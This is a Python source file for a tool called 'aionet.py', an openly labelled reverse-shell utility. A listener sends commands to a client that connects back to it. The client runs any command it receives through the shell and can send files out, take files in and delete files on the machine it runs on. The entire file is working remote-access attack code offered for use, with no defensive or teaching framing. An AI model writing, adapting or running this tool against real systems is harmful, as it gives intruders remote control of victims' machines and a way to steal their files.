# Import required libraries
import argparse
import base64
import hashlib
import os
import socket
import subprocess
import sys
import threading


# Create a class for the server (listener)
class Server:
	# Define constructor with port as argument
	def __init__(self,port):
		# Set host to 0.0.0.0 to accept all IPs linked to the host
		# Set port to the one specified during object instantiation
		self.host = "0.0.0.0"
		self.port = port
		
		# Create a socket object, bind it to the host, listen for connections and inform the user
		listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
		listener.bind((self.host,self.port))
		listener.listen(5)
		print(f"Listening on {self.host}:{self.port}")

		# Accept connections and create a separate thread for each connection
		while True:
			self.connection, self.address = listener.accept()
			print()
			print(f"Received connection from {self.address}")
			ct = threading.Thread(target=self.handle, args=())
			ct.start()
	

	# Define method to handle connections
	def handle(self):
		# Infinite loop to handle connections
		while True:
			# Provide shell prompt and receive input
			command = input("AIONet > ")

			# Check if upload command was used (append a new-line sentinel no matter the command)
			if command[0:6] == "upload":
				# Use the upload_file function to get base64 file and SHA256 hash
				content,chash = self.upload_file(command)
				# Create the bytes object to be sent
				command = bytes(command, "utf-8") + b' ' + content + b' ' + chash +b'\n'
			else:
				command += "\n"

			# If exit command received, inform the client and close the connection
			if command == "exit\n":
				print(f"Closing connection to {self.address[0]}")
				self.connection.send(bytes(command, "utf-8"))
				print("Connection closed")
				sys.exit(0)

			# Get the response using the Remote Code Execution (RCE) function
			response = self.rce(command)

			# If download command is run, call the download_file function
			if type(command) is not bytes:
				if command[0:8] == "download":
					response = self.download_file(command, response)
				
			# Print the response received
			print(response)


	# Define function to download files from a client
	def download_file(self, command, response):
		# Get the filename from the second part of the input
		path = str(command).split(" ")[1].rstrip()
		# Use the response to get the base64 file and its hash
		response = response.split(" ")
		received = response[0].strip()
		content = response[1].strip()
		try:
			with open(path,"wb") as dl_file:
				# Decode the base64 content
				dec_content = base64.b64decode(content)
				# Find the hash on the local machine
				local = hashlib.sha256(dec_content).hexdigest()
				# If the hashes match, write the file and return a success message
				if received == local:
					dl_file.write(dec_content)
					dl_file.close()
					return f"Downloaded {path}\nSHA256 hash verified:\nReceived: {received}\nLocal:    {local}\n"
				else:
					# Raise a hash verification failed exception
					raise Exception("Hash verification failed.")
		except Exception as e:
			# Catch any exceptions, remove the file (if created) and return the error message
			os.remove(path)
			return f"Download failed: {str(e)}\n"

	
	# Define method to upload files to the client
	def upload_file(self, command):
		# Get the file name from the second part of the input
		path = command.split(" ")[1]
		with open(path, "rb") as up_file:
			# Read the file and hash its contents
			content = up_file.read()
			content_hash = hashlib.sha256(content).hexdigest()
			# Convert the hash and contents to bytes
			if type(content) is not bytes:
				content = bytes(content, "utf-8")
			if type(content_hash) is not bytes:
				content_hash = bytes(content_hash, "utf-8")
			# Return hash and base64 encoded contents
			return base64.b64encode(content), content_hash
	
	
	# Define method to executre commands remotely
	def rce(self, command):
		# Convert command to bytes
		if type(command) is not bytes:
			command = bytes(command, "utf-8")
		# Send the command to the client
		self.connection.send(command)

		# Create a response string
		response = "\n"
		# Receive data in chunks and append to the response string till the \0 sentinel is received
		while response[-1] != "\x00":
			data = self.connection.recv(4096)
			response += data.decode("utf-8")
		# Strip the leading and trailing whitespace/new-line
		response.strip()

		# Return the response
		return response


class Client:
	def __init__(self, ip, port):
		self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		self.connection.connect((ip, port))
		lt = threading.Thread(target=self.run, args=())
		lt.start()


	def exec_command(self, command):
		return subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)


	def move_fs(self, command):
		new_dir = command.split(" ")[1]
		try:
			os.chdir(new_dir)
			return f"Changed directory to {new_dir}\n"
		except Exception as e:
			return f"Error changing directory: {str(e)}\n"


	def remove_file(self, command):
		to_remove = command.split(" ")[1]
		try:
			os.remove(to_remove)
			return f"Removed {to_remove}\n"
		except Exception as e:
			return f"Error removing file: {str(e)}\n"

	
	def run(self):
		while True:
			command = ""
			while "\n" not in command:
				command += self.connection.recv(4096).decode("utf-8")
			command = command.rstrip()

			result = ""
			try:
				if command == "exit":
					self.connection.close()
					sys.exit(0)
				elif command[0:2] == "cd":
					if len(command) > 3:
						result = self.move_fs(command)
					else:
						raise Exception("Path missing")
				elif command[0:8] == "download":
					result = self.read_file(command)
				elif command[0:6] == "upload":
					result = self.write_file(command)
				elif command[0:2] == "rm":
					if len(command) > 3:
						result = self.remove_file(command)
					else:
						raise Exception("File name missing")
				else:
					result = self.exec_command(command)
			except Exception as e:
				result = f"Error: {str(e)}"

			if type(result) is not bytes:
				result += "\0"
			else:
				result += b"\0"

			if type(result) is not bytes:
				result = bytes(result, "utf-8")

			self.connection.send(result)


	def read_file(self, command):
		path = str(command).split(" ")[1].rstrip()
		with open(path, "rb") as in_file:
			content = in_file.read()
			content_hash = hashlib.sha256(content).hexdigest()
			if type(content) is not bytes:
				content = bytes(content, "utf-8")
			if type(content_hash) is not bytes:
				content_hash = bytes(content_hash, "utf-8")
			combined = content_hash + b" " + base64.b64encode(content)
			return combined


	def write_file(self, command):
		split_command = command.split(" ")
		path = split_command[1]
		content = split_command[2]
		chash = split_command[3]
		try:
			with open(path,"wb") as out_file:
				dec_content = base64.b64decode(content)
				whash = hashlib.sha256(dec_content).hexdigest()
				if chash == whash:
					out_file.write(dec_content)
					out_file.close()
					return f"Uploaded {path}\nSHA256 hash verified:\nReceived: {chash}\nLocal:    {whash}\n"
				else:
					raise Exception("Hash verification failed.")
		except Exception as e:
			os.remove(path)
			return f"Upload failed: {str(e)}\n"


def define_args():
	usage_str = """- Reverse shell spawning
	On host: python3 aionet.py -p PORT -l
	On remote machine: python3 aionet.py -t TARGET -p PORT"""
	parser = argparse.ArgumentParser(description="All-In-One Network Utility by Aditya Arole (@e1ora)",usage=usage_str)
	parser.add_argument("-t","--target",dest="target",type=str,metavar="target",help="IP address of the remote listener")
	parser.add_argument("-p","--port",dest="port",type=int,metavar="port",help="If used with -l, port where listener is to be created; else, port where remote listener exists")
	parser.add_argument("-l","--listen",dest="listen",action="store_true",help="Create a listener on the port defined using -p")
	parser.set_defaults(listen=False)

	if not len(sys.argv) > 1:
		parser.print_help()
		exit()
	
	return parser.parse_args(sys.argv[1:])


def main():
	args = define_args()

	if args.listen:
		Server(args.port)
	else:
		Client(args.target,args.port)


if __name__ == "__main__":
	try:
		main()
	except KeyboardInterrupt:
		print("Exiting")
		sys.exit(0)
